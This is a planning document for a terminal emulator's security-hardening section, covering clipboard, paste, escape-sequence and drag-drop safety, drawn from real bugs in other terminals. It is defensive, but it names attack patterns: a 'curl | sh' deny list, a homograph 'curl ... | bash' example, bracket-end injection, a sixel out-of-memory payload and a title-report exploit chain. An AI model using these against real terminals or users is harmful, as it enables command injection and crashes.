---
section: 45
title: Security Hardening
status: not-started
tier: 5
goal: "Harden terminal escape sequence handling against clipboard exfiltration, paste injection, and other security-sensitive operations. Defense-in-depth: require focus for clipboard access, confirmation dialogs for dangerous operations, configurable allow/deny policies."
sections:
  - id: "45.1"
    title: OSC 52 Clipboard Restrictions
    status: not-started
  - id: "45.2"
    title: Paste Safety
    status: not-started
  - id: "45.3"
    title: Escape Sequence Sandboxing
    status: not-started
  - id: "45.4"
    title: Drag-Drop & Hyperlink Safety
    status: not-started
  - id: "45.5"
    title: Section Completion
    status: not-started
---

# Section 45: Security Hardening

**Status:** Not Started
**Goal:** Harden the terminal against malicious escape sequences and clipboard attacks. Browsers restrict clipboard access to user-initiated interactions — terminals should apply the same principle. Defense-in-depth: focus-gated clipboard, confirmation dialogs, configurable policies.

**Crate:** `oriterm_core` (policy checks in handler), `oriterm` (focus state, confirmation UI), `oriterm_mux` (event filtering)
**Dependencies:** Section 09 (Selection & Clipboard), Section 21 (Context Menu — for confirmation dialogs), Section 13 (Configuration)

**Reference:**
- Chromium clipboard: requires user gesture (transient activation) for `navigator.clipboard.writeText()`
- Kitty: `clipboard_control` config option with `write-clipboard`, `read-clipboard`, `write-primary`, `read-primary` granularity
- WezTerm: `enable_csi_u_key_encoding`, paste confirmation for bracketed paste
- Ghostty: `clipboard-read`, `clipboard-write` config (allow/deny/ask)
- iTerm2: confirmation prompt for OSC 52 clipboard writes, configurable per-profile

**Windows Terminal security fixes** (real bugs, real fixes — learn from their mistakes):
- [#19051](https://github.com/microsoft/terminal/issues/19051) / [PR#19357](https://github.com/microsoft/terminal/pull/19357) (Feb 2026): **OSC 52 focus gating** — background sessions could silently write to system clipboard. Fix: gate OSC 52 clipboard writes on `_isFocused` flag.
- [#13014](https://github.com/microsoft/terminal/issues/13014) / [PR#19067](https://github.com/microsoft/terminal/pull/19067) (Aug 2025): **Bracketed paste mode bypasses multiline paste warning** — a malicious app enables bracketed paste + writes attack script to clipboard via OSC 52, then user right-clicks to "paste". Shells like PowerShell/cmd don't handle bracketed paste, so the warning was the only safety net — and it was disabled. Fix: `WarnAboutMultiLinePaste` enum with `always`/`never`/`if-bracketed-paste-disabled` options.
- [#8601](https://github.com/microsoft/terminal/issues/8601) / [PR#8634](https://github.com/microsoft/terminal/pull/8634) (Jan 2021): **Multiline paste warning bypass via `\r`** — reported to MSRC. Web page sets clipboard to text ending in `\r` (not `\n`), warning doesn't trigger, shell executes on paste. Fix: detect both `\r` and `\n` in multiline warning; normalize `\n` → `\r` on paste.
- [#12206](https://github.com/microsoft/terminal/issues/12206) / [PR#12211](https://github.com/microsoft/terminal/pull/12211) (Jan 2022): **Title escape sequence injection at startup** — escape sequences in tab title config weren't sanitized on the startup path, so they were interpreted as VT sequences (e.g., background color change). Fix: move sanitization into `SetTitle` method to cover all code paths.
- [#10312](https://github.com/microsoft/terminal/issues/10312) / [PR#10847](https://github.com/microsoft/terminal/pull/10847) (Aug 2021): **C1 control character injection in titles** — title sanitization only stripped C0 (0x00–0x1F), not C1 (0x80–0x9F). Malicious program injects C1 chars → VT parser misinterprets them. Fix: strip both C0 and C1 ranges.
- [#14381](https://github.com/microsoft/terminal/issues/14381) / [#16205](https://github.com/microsoft/terminal/issues/16205): **Paste-to-tab-title leaks to terminal input** — pasting via Ctrl+V while renaming a tab also sends clipboard content to the shell. Clipboard content executes immediately if it contains newlines. Root cause: input routing doesn't suppress terminal paste when UI text field has focus.
- [#19015](https://github.com/microsoft/terminal/issues/19015) / [PR#19026](https://github.com/microsoft/terminal/pull/19026) (Jun 2025): **Drag-drop crash on malformed paths** — forward slashes, relative paths (`..`), and `.` in drag-drop objects crash the terminal. Fix: null-check + path normalization.
- [#18006](https://github.com/microsoft/terminal/issues/18006): **WSL path single-quote injection** — `D:\John's Archive` dropped as `'/mnt/d/John's Archive'` which breaks POSIX shell quoting. Effectively a command injection via crafted file path.
- [#7562](https://github.com/microsoft/terminal/issues/7562): **URI scheme security** — discussion about which schemes to allow for clickable hyperlinks. `file://`, custom protocol handlers can be dangerous.
- [#3080](https://github.com/microsoft/terminal/issues/3080): **Split OSC string terminator parser corruption** — when an unrecognized OSC's `ST` is split across packets (timing-dependent), the VT parser gets stuck in a corrupt state, printing literal chars and breaking cursor movement.
- [#12964](https://github.com/microsoft/terminal/issues/12964): **Unbounded memory from verbose output** — fast-scrolling verbose output causes unbounded memory growth until the OS kills the process. Resource exhaustion vector.

**Alacritty security patterns and issues** (design decisions and gaps — learn from both):
- [#3386](https://github.com/alacritty/alacritty/issues/3386) (Feb 2020): **OSC restriction config request** — request to allow users to disable arbitrary OSCs via config. Motivated by xterm's `allowWindowOps`. Window manipulation sequences (CSI t) can resize, move, iconify, or fullscreen the terminal — a malicious program shouldn't be able to do this. OSC 7 (CWD change) and OSC 50 (font change) also flagged as potentially unwanted. *Lesson: configurable per-sequence allow/deny policy, not just clipboard.*
- [#5246](https://github.com/alacritty/alacritty/issues/5246) (Jun 2021): **Accidental link click as CSRF vector** — clicking terminal output to focus the window accidentally opens a URL. A malicious program crafts output with a CSRF URL, user clicks to focus, browser fires the request. Alacritty's default is click-to-open (no modifier key). Users argue this is a security issue. *Lesson: require a modifier key (Ctrl/Shift) for link activation by default. Never open URLs on bare click.*
- [#1335](https://github.com/alacritty/alacritty/issues/1335) / [#8492](https://github.com/alacritty/alacritty/issues/8492) (May 2018–Feb 2025): **Drag-drop doesn't escape file paths** — Alacritty deliberately does NOT escape drag-drop paths (wontfix). Spaces, parentheses, single quotes in filenames cause shell syntax errors or command injection. `bash` is confirmed vulnerable to pastejacking via this vector. *Lesson: we MUST shell-escape drag-drop paths — Alacritty's wontfix is our must-fix.*
- **Osc52 enum** (source code): Alacritty's `Osc52` config enum — `Disabled`/`OnlyCopy`(default)/`OnlyPaste`/`CopyPaste` — is a well-designed granular policy. Default `OnlyCopy` means applications can write to clipboard but never read from it. *Lesson: adopt this pattern for our clipboard policy.*
- **Title stack depth limit** (source code): `TITLE_STACK_MAX_DEPTH = 4096` caps push_title operations, preventing unbounded memory growth from rapid title push/pop sequences. *Lesson: cap all stack-like VT state (title stack, keyboard mode stack, etc.).*
- **No title sanitization** (source code): Alacritty's `set_title()` passes title content through unsanitized — no C0/C1 stripping. This is a known gap that WT explicitly fixed. *Lesson: we must not follow Alacritty here.*

**WezTerm security fixes** (real bugs, real fixes — learn from their mistakes):
- [#1610](https://github.com/wezterm/wezterm/issues/1610) (Feb 2022): **CVE-2022-24130 — sixel repeat count OOM crash** — a sixel sequence with repeat count `0x7FFFFFFF` causes a 100GB+ allocation → OOM kill. Fix: `check_image_dimensions()` with `MAX_IMAGE_SIZE = 100_000_000` bytes cap, checked before allocation. Cross-terminal CVE affecting xterm, mintty, others. *Lesson: validate repeat counts and image dimensions BEFORE allocating.*
- [#1631](https://github.com/wezterm/wezterm/issues/1631) (Feb 2022): **Undefined behavior in VT parser** — `vtparse` used `get_unchecked` to index a state table, causing out-of-bounds reads detectable by Miri and AddressSanitizer. Not directly exploitable but violates memory safety. Fix: remove `unsafe` indexing. *Lesson: zero `unsafe` in parser code — we already enforce `unsafe_code = "deny"`.*
- [#416](https://github.com/wezterm/wezterm/issues/416) (Jan 2021): **Restrictive umask leaks to child processes** — WezTerm set `umask 0077` for mux socket security, but forgot to restore the original umask before spawning shells. All files created by the user had `rw-------` permissions, breaking `brew`, `mysql`, and other tools. Users had to reinstall macOS. Fix: save and restore umask around child spawn. *Lesson: security-hardening one layer (socket permissions) must not leak side effects to child processes.*
- [#714](https://github.com/wezterm/wezterm/issues/714) (Apr 2021): **Hyperlink regex DoS on long lines** — applying URL-detection regex to a 1.5MB single-line JSON output hangs the terminal (3.8GB memory, 100% CPU in `get_lines_with_hyperlinks_applied`). *Lesson: regex-based hyperlink detection needs line-length limits or bounded execution time. Never run unbounded regex on untrusted input.*
- [#3727](https://github.com/wezterm/wezterm/issues/3727) (Sep 2023): **Notification spam from background processes** — OSC 777 notifications fire even when the window is focused, creating a notification flood. Fix: `notification_handling` config with `SuppressFromFocusedPane`/`SuppressFromFocusedTab`/`AlwaysShow`/`NeverShow`. *Duplicates our focus-gating concept — notifications should also be focus-aware.*
- [#1952](https://github.com/wezterm/wezterm/issues/1952) (May 2022): **Cargo audit: outdated dependencies with known vulnerabilities** — xcb crate unsoundness, chrono issues, etc. Fix: dependency pruning. *Lesson: regular `cargo audit` and dependency hygiene is a security practice, not just housekeeping.*

**Ghostty security patterns** (well-designed defense-in-depth from Zig codebase):
- **Clipboard paste protection** (source: `Surface.zig`, `input/paste.zig`): Ghostty has a comprehensive paste safety model. `clipboard-paste-protection = true` (default) shows a `ClipboardConfirmationDialog` (GTK: full dialog, macOS: native sheet) before pasting anything detected as unsafe. `isSafe()` checks for `\n` AND `\x1b[201~` (bracket end injection). Configurable: `clipboard-paste-bracketed-safe = true` (default) trusts bracketed pastes, but even when trusted, Ghostty STILL checks for `\x1b[201~` inside the paste data — if the paste contains a bracket end sequence, it's flagged as unsafe regardless. *Lesson: always detect bracket-end injection (`\x1b[201~`) in paste data, even during bracketed paste mode. This is the most sophisticated paste attack.*
- **Clipboard access policy** (source: `Config.zig`): `clipboard-read = .ask` (default), `clipboard-write = .allow` (default). `ClipboardAccess` enum: `allow`/`deny`/`ask`. The `.ask` option shows a confirmation dialog — unlike Alacritty's binary allow/deny, Ghostty adds an interactive confirmation path. *Lesson: our `"ask"` policy should show a non-blocking confirmation dialog.*
- **Title report disabled by default** (source: `Config.zig:2296`): `title-report = false` (default). CSI 21 t allows programs to query the window title — Ghostty's docs warn: "This can expose sensitive information at best and enable arbitrary code execution at worst (with a maliciously crafted title and a minor amount of user interaction)." *Lesson: title reporting is a known exploit chain (set title to malicious payload → query title → response injected into input stream). Deny by default.*
- [#10762](https://github.com/ghostty-org/ghostty/issues/10762) (Feb 2026): **Homograph attack detection in paste** — Ghostty should detect mixed-script URLs in paste data (Cyrillic `і` vs Latin `i`). `curl https://іnstall.example-clі.dev | bash` looks legitimate but points to a fake server. *Lesson: beyond newline detection, paste safety should detect confusable Unicode in URLs — at minimum, flag mixed-script domains.*
- [#1325](https://github.com/ghostty-org/ghostty/issues/1325): **Secure Keyboard Entry** — macOS `EnableSecureEventInput` API prevents other processes (keyloggers) from intercepting keyboard input. Ghostty implements `toggle_secure_input` action. Not applicable to Windows (our target), but worth noting for future platform support.
- [#1566](https://github.com/ghostty-org/ghostty/issues/1566): **CGroup process isolation** — Linux systemd cgroup per-surface for memory/resource limits. Ghostty has full `os/cgroup.zig` module that creates, moves processes into, and removes cgroups. Not applicable to Windows, but worth noting for future Linux support.
- **Image storage limit** (source: `Config.zig:2305`, `Screen.zig:258`): `image-storage-limit = 320MB` (default), configurable up to 4GB, `0` disables all image protocols. Per-screen (primary + alternate separately). *Lesson: our image memory cap should be configurable and split per-screen.*

**Why this matters:** A malicious program (or crafted `cat` output) can silently write to the system clipboard via OSC 52, then social-engineer the user into pasting it elsewhere. OSC 52 read is even worse — it exfiltrates clipboard contents without user awareness. These are real attack vectors documented in terminal security advisories.

---

## 45.1 OSC 52 Clipboard Restrictions

Clipboard access via OSC 52 must be gated by window focus and configurable policy.

### Focus-gated clipboard access

- [ ] Track window focus state in `App` (already available via winit `WindowEvent::Focused`)
- [ ] Propagate focus state to `Term<T>` via a `set_focused(bool)` method or through the event system
- [ ] OSC 52 clipboard **write** (`ClipboardStore`): only execute when terminal window has focus. Silently discard when unfocused.
- [ ] OSC 52 clipboard **read** (`ClipboardLoad`): only execute when terminal window has focus. Send empty response when unfocused.
- [ ] Log discarded OSC 52 operations at `debug` level for diagnostics

### Confirmation dialog for clipboard writes

- [ ] When `clipboard_control.confirm_osc_write = true` (default: false), show a confirmation dialog before writing to clipboard via OSC 52
- [ ] Dialog shows: source pane, truncated preview of the text being written, "Allow" / "Deny" / "Always allow for this session" buttons
- [ ] "Always allow for this session" sets a per-pane flag that suppresses future confirmations for that pane
- [ ] Dialog is non-blocking — OSC 52 write is queued until user responds. If user closes dialog without responding, discard the write.

### Configurable clipboard policy

- [ ] Config keys:
  ```toml
  [security]
  # Per-operation allow/deny/ask policy for OSC 52 clipboard access.
  # "allow" = permit silently, "deny" = block silently, "ask" = show confirmation dialog
  clipboard_write = "allow"       # OSC 52 write to system clipboard
  clipboard_read = "deny"         # OSC 52 read from system clipboard (dangerous — off by default)
  primary_write = "allow"         # OSC 52 write to primary selection (X11/Wayland)
  primary_read = "deny"           # OSC 52 read from primary selection
  clipboard_max_size = 1048576    # Max bytes for OSC 52 clipboard write (1 MB default)
  ```
- [ ] `clipboard_read = "deny"` by default — reading the system clipboard is a privacy risk. Programs that need it (e.g., tmux) can be accommodated by setting `"allow"` or `"ask"`. This matches Alacritty's `OnlyCopy` default (write allowed, read denied). Ghostty defaults to `clipboard-read = "ask"` (shows confirmation dialog), which is even more permissive but still protected.
- [ ] `clipboard_write = "allow"` by default (focus-gated) — most users expect clipboard integration to work
- [ ] `clipboard_max_size` rejects oversized clipboard writes (prevents OOM from malicious payloads)
- [ ] Policy enforcement in `Term::osc_clipboard_store()` and `Term::osc_clipboard_load()` — check policy before emitting `Event::ClipboardStore`/`ClipboardLoad`

### Tests

- [ ] **Tests** (`oriterm_core/src/term/handler/tests.rs`):
  - [ ] OSC 52 write allowed when focused, policy = "allow"
  - [ ] OSC 52 write blocked when unfocused (no ClipboardStore event emitted)
  - [ ] OSC 52 read blocked when policy = "deny" (empty response sent)
  - [ ] OSC 52 write exceeding `clipboard_max_size` rejected
  - [ ] Policy "ask" emits a confirmation request event instead of immediate clipboard write

---

## 45.2 Paste Safety

Protect against paste injection attacks (malicious content that executes commands).

### Multi-line paste confirmation

- [ ] When pasting text containing newlines into a non-bracketed-paste terminal, show a confirmation dialog (already partially implemented — verify and harden)
- [ ] Detect BOTH `\n` AND `\r` as line separators — WT #8601 showed `\r`-only pastes bypass `\n`-only detection. A malicious web page can `clipboardData.setData("text/plain", "evil command\r")` and the warning never fires.
- [ ] Normalize line endings on paste: `\r\n` → `\r`, `\n` → `\r` (single pass, same as WT PR#8634)
- [ ] Dialog shows: line count, truncated preview, "Paste" / "Cancel" buttons
- [ ] Configurable: `paste_confirmation = "auto"` (default). Values: `"always"` (warn even with bracketed paste), `"never"`, `"auto"` (warn only when bracketed paste is off). Matches WT PR#19067's `WarnAboutMultiLinePaste` enum.
- [ ] **Do NOT blindly trust bracketed paste mode** — WT #13014 showed that a malicious TUI app can enable bracketed paste mode + write to clipboard via OSC 52, then when the user right-clicks, the paste warning is suppressed and the shell executes the payload. PowerShell and cmd don't support bracketed paste, so `"auto"` mode should still warn for shells that lack bracketed paste support.
- [ ] **Bracket-end injection detection** (Ghostty pattern) — ALWAYS check paste data for `\x1b[201~` (bracketed paste end sequence), even during bracketed paste mode. If paste contains this sequence, the paste is ALWAYS unsafe — a malicious payload can exit the bracket fence and inject raw commands. Ghostty checks this unconditionally before any other safety logic (Surface.zig:6199).

### Dangerous content detection

- [ ] Detect pastes containing `sudo`, `rm -rf`, `curl | sh`, `wget | bash`, or other dangerous patterns
- [ ] When detected, show a warning-level confirmation: "This paste contains potentially dangerous commands. Continue?"
- [ ] Configurable pattern list in config (allow users to add/remove patterns)
- [ ] Configurable: `paste_danger_detection = true` (default: true)
- [ ] **Homograph attack detection** (Ghostty #10762) — detect mixed-script URLs in paste data. A URL containing both Latin and Cyrillic lookalike characters (e.g., Cyrillic `і` U+0456 vs Latin `i` U+0069) is suspicious. `curl https://іnstall.example-clі.dev | bash` looks identical to the legitimate URL. Flag mixed-script domains as dangerous and show a warning.

### Input routing during UI focus (WT #14381)

- [ ] When a UI text field has focus (tab rename, search bar, settings), keyboard paste (Ctrl+V / Ctrl+Shift+V) must NOT also send clipboard content to the terminal
- [ ] Input dispatcher must check whether a UI overlay is capturing input before routing paste to the PTY
- [ ] This is a defense-in-depth concern — the paste would bypass the multiline warning because it goes through a different code path

### Tests

- [ ] **Tests**:
  - [ ] Multi-line paste triggers confirmation when bracketed paste mode is off
  - [ ] Multi-line paste skips confirmation when bracketed paste mode is on (if `"auto"` mode)
  - [ ] `"always"` mode warns even when bracketed paste is on
  - [ ] Single-line paste never triggers confirmation
  - [ ] Paste containing only `\r` (no `\n`) still triggers multiline warning
  - [ ] Paste containing `\r\n` triggers multiline warning
  - [ ] Dangerous pattern detection identifies `sudo` in paste content
  - [ ] Dangerous pattern detection configurable (can add/remove patterns)
  - [ ] Paste containing `\x1b[201~` (bracket end) flagged as unsafe even during bracketed paste
  - [ ] Homograph attack: mixed-script URL in paste triggers warning
  - [ ] Paste during tab rename does NOT leak to terminal input

---

## 45.3 Escape Sequence Sandboxing

Limit what escape sequences can do to the host system.

### File access restrictions

- [ ] Kitty graphics `t=f` (file transmission): restrict to configurable allowed directories (default: temp dirs only). Reject path traversal (`..`). Already implemented — verify and document.
- [ ] iTerm2 `inline=0` (file download): require user confirmation before writing files
- [ ] Log all file access attempts at `info` level

### Resource limits

- [ ] Max concurrent image count per terminal (prevent resource exhaustion). Default: 256 images.
- [ ] Max total image memory already implemented (ImageCache `memory_limit`) — verify it's enforced on all paths
- [ ] Max APC/DCS/OSC payload sizes already implemented — verify caps are reasonable
- [ ] **Sixel repeat count validation** (CVE-2022-24130, WezTerm #1610) — validate sixel repeat counts and image dimensions BEFORE allocating. A sixel `!0x7FFFFFFF@` causes 100GB+ allocation → OOM kill. Cap decoded image size at a configurable maximum (WezTerm uses 100MB). Check `width * height * 4 <= max` with saturating arithmetic.
- [ ] **Hyperlink regex line-length cap** (WezTerm #714) — applying URL-detection regex to a 1.5MB single line causes 3.8GB memory usage and 100% CPU hang. Cap the line length for hyperlink regex matching (e.g., skip lines > 10KB). Never run unbounded regex on untrusted input.
- [ ] **Image storage limit per-screen** (Ghostty pattern) — configurable `image_storage_limit` (default: 320MB), separate for primary and alternate screens. Setting to 0 disables all image protocols. Effective limit is double per surface (primary + alt). This is cleaner than a single global cap — alt screen images shouldn't evict primary screen images.
- [ ] **Notification focus-gating** (WezTerm #3727) — OSC 777/9 notifications should be suppressed when the terminal window/pane is focused. Configurable policy: `always`/`never`/`suppress_when_focused` (default: `suppress_when_focused`). Prevents notification spam from background processes.

### Window title safety (WT #12206, #10312)

- [ ] OSC 0/2 (set window title): sanitize BOTH C0 (0x00–0x1F) AND C1 (0x80–0x9F) control characters from title strings. WT initially only stripped C0 — C1 injection was a separate bug (PR#10847). Strip in the `set_title()` method itself, not in a caller, so ALL paths are covered (WT #12206 was caused by sanitizing in one caller but missing another).
- [ ] OSC 7 (set CWD): validate as path, reject URLs or injection attempts
- [ ] Configurable: `allow_title_change = true` (default: true, matching most terminals)

### Title reporting restriction (Ghostty pattern)

- [ ] CSI 21 t (report title): **disabled by default**. Ghostty's docs warn: "This can expose sensitive information at best and enable arbitrary code execution at worst (with a maliciously crafted title and a minor amount of user interaction)." Attack chain: malicious program sets title to payload via OSC 0 → program queries title via CSI 21 t → terminal responds with title in input stream → if title contains escape sequences, they execute. Configurable:
  ```toml
  [security]
  title_report = false   # CSI 21 t: report window title back to application
  ```
- [ ] When disabled, respond with an empty title or ignore the request entirely

### Window manipulation sequence restriction (Alacritty #3386, xterm allowWindowOps)

- [ ] CSI t (window manipulation) sequences can resize, move, iconify, maximize, or fullscreen the terminal window. A malicious program (or crafted `cat` output) should NOT be able to do this without user consent.
- [ ] Default: deny window manipulation sequences. Configurable via:
  ```toml
  [security]
  allow_window_ops = false   # CSI t window manipulation (resize, move, iconify, etc.)
  ```
- [ ] OSC 50 (font change): deny by default — prevents a malicious program from changing the terminal font to something unreadable or to a font that renders different glyphs for the same codepoints (homoglyph attack)
- [ ] Log denied window manipulation attempts at `debug` level

### VT state stack limits (Alacritty pattern)

- [ ] Cap title stack depth (push_title/pop_title) to prevent unbounded memory growth. Default: 4096 (matches Alacritty's `TITLE_STACK_MAX_DEPTH`).
- [ ] Cap keyboard mode stack depth similarly
- [ ] Cap any other push/pop VT state (saved cursor stack, charset stack, etc.)

### Child process environment hygiene (WezTerm #416)

- [ ] Any security-hardening state set by the terminal (e.g., restrictive umask for mux sockets, modified env vars) must be restored to the user's original values before spawning child processes. WezTerm set `umask 0077` for socket security but leaked it to shells, breaking all file creation permissions. Users had to reinstall macOS.
- [ ] Save original umask at startup, restore before `exec` in child processes
- [ ] Do not inject, override, or clobber user environment variables (especially `SSH_AUTH_SOCK`, `TERM`, etc.) without explicit opt-in configuration

### VT parser robustness (WT #3080)

- [ ] Ensure the VT parser handles split/fragmented escape sequences correctly — an OSC string terminator (`ESC \`) split across two reads must not corrupt parser state
- [ ] Unrecognized escape sequences must be silently discarded without leaving the parser in a bad state (no literal character leakage, no cursor movement corruption)
- [ ] Fuzz test the VT parser with: split sequences at every byte boundary, interleaved timing delays, nested/overlapping sequences, maximum-length payloads

### Tests

- [ ] **Tests**:
  - [ ] Kitty file transmission with path traversal rejected
  - [ ] Window title with C0 control characters sanitized
  - [ ] Window title with C1 control characters (0x80–0x9F) sanitized
  - [ ] OSC 7 with invalid path rejected
  - [ ] Image count limit enforced
  - [ ] Sixel with repeat count 0x7FFFFFFF rejected (CVE-2022-24130)
  - [ ] Sixel image exceeding MAX_IMAGE_SIZE rejected before allocation
  - [ ] Image storage limit enforced per-screen (primary and alternate separately)
  - [ ] Hyperlink regex skipped for lines exceeding length cap
  - [ ] CSI 21 t (title report) blocked when `title_report = false`
  - [ ] Notification suppressed when window is focused (OSC 777/9)
  - [ ] Child process umask matches parent's original umask, not terminal's hardened umask
  - [ ] CSI t window manipulation denied when `allow_window_ops = false`
  - [ ] Title stack push beyond 4096 drops oldest entry (no OOM)
  - [ ] Split OSC string terminator does not corrupt parser state

---

## 45.4 Drag-Drop & Hyperlink Safety

Protect against command injection via file paths and dangerous URIs.

### Drag-drop path safety (WT #19015, #18006)

- [ ] Validate and normalize all drag-drop file paths before inserting into terminal input
- [ ] Reject or normalize: forward slashes on Windows, relative paths containing `..`, bare `.` paths (WT #19015 — these crashed the terminal)
- [ ] Shell-escape paths properly for the target shell. For POSIX shells (WSL/bash/zsh): escape single quotes using `'\''` pattern, not naive wrapping in single quotes (WT #18006 — `John's Archive` broke shell quoting and became a command injection vector)
- [ ] For PowerShell: escape backticks and special characters appropriately
- [ ] Never pass unsanitized file paths to the PTY

### Link click modifier requirement (Alacritty #5246)

- [ ] **Never open URLs on bare mouse click** — require a modifier key (default: Ctrl+Click or Shift+Click) to activate a hyperlink. A bare click to focus the terminal window should not open a URL in the output. This is a real CSRF vector: malicious program writes a CSRF URL to terminal output, user clicks to focus, browser fires the request.
- [ ] Configurable modifier in config:
  ```toml
  [hints]
  link_click_modifier = "Control"   # "Control", "Shift", "Control|Shift", "None" (bare click)
  ```
- [ ] Default: `"Control"` (Ctrl+Click to open links)

### URI/hyperlink scheme allowlist (WT #7562)

- [ ] Only allow known-safe URI schemes for clickable hyperlinks (OSC 8): `https`, `http`, `file`, `mailto`
- [ ] Block or warn on potentially dangerous schemes: `javascript:`, `data:`, `vbscript:`, custom protocol handlers
- [ ] Configurable allowlist in config:
  ```toml
  [security]
  allowed_link_schemes = ["https", "http", "file", "mailto"]
  ```
- [ ] When a blocked scheme is clicked, show a warning dialog instead of opening

### Tests

- [ ] **Tests**:
  - [ ] Drag-drop path with `..` traversal normalized/rejected
  - [ ] Drag-drop path with single quotes properly shell-escaped for POSIX
  - [ ] Drag-drop path with forward slashes on Windows normalized
  - [ ] URI scheme not in allowlist blocked from opening
  - [ ] `javascript:` scheme blocked
  - [ ] `https` scheme allowed
  - [ ] Bare mouse click does NOT open URL (modifier required)
  - [ ] Ctrl+Click opens URL when `link_click_modifier = "Control"`

---

## 45.5 Section Completion

### Completion checklist

- [ ] All 45.1–45.4 items complete
- [ ] OSC 52 clipboard: focus-gated, configurable policy, optional confirmation
- [ ] Paste safety: multi-line confirmation (detects `\r` and `\n`), dangerous content detection, bracket-end injection detection, homograph URL detection, bracketed paste doesn't blindly suppress warnings
- [ ] Input routing: paste during UI focus (tab rename, search) does not leak to terminal
- [ ] Escape sequence sandboxing: file access, resource limits, title safety (C0 + C1 stripped)
- [ ] VT parser: split sequences handled correctly, no state corruption, zero `unsafe` in parser
- [ ] Resource limits: sixel repeat count validated (CVE-2022-24130), hyperlink regex line-length capped
- [ ] Child process hygiene: umask and env vars restored before spawn
- [ ] Window manipulation: CSI t denied by default, OSC 50 (font change) denied
- [ ] Title reporting: CSI 21 t denied by default (Ghostty pattern — exploit chain risk)
- [ ] VT state stacks: title stack, keyboard mode stack capped at 4096
- [ ] Image storage: per-screen limit (primary + alt separately), configurable, 0 = disable
- [ ] Notifications: focus-gated (OSC 777/9 suppressed when focused)
- [ ] Drag-drop: paths normalized, shell-escaped, no traversal or injection
- [ ] Hyperlinks: URI scheme allowlist enforced, modifier key required for click (no bare click → CSRF)
- [ ] All security policies have sane defaults (secure by default, opt-in for risky features)
- [ ] `./build-all.sh` — builds cleanly
- [ ] `./test-all.sh` — all tests pass
- [ ] `./clippy-all.sh` — no warnings

**Exit Criteria:** OSC 52 clipboard access is focus-gated and policy-controlled (Alacritty-style `Disabled`/`OnlyCopy`/`OnlyPaste`/`CopyPaste` enum). Paste operations have confirmation dialogs for dangerous content (detecting both `\r` and `\n`), bracket-end injection (`\x1b[201~`) always flagged, homograph URL detection for mixed-script domains, with bracketed paste mode not blindly suppressing warnings. Escape sequences cannot access arbitrary files or exhaust resources — sixel repeat counts are validated before allocation (CVE-2022-24130), image storage limited per-screen (320MB default). Title reporting (CSI 21 t) disabled by default (exploit chain risk). Window manipulation sequences (CSI t) denied by default. Window titles sanitized against C0 and C1 injection. VT state stacks (title, keyboard mode) depth-capped. Hyperlink regex capped to prevent DoS on long lines. Child process environment hygiene maintained (umask, env vars restored before spawn). Notifications focus-gated. Drag-drop paths normalized and shell-escaped. Hyperlink clicks require modifier key and restricted to allowlisted URI schemes (no bare click → CSRF). VT parser handles fragmented sequences without state corruption and contains zero `unsafe` code. All security features configurable with secure defaults.
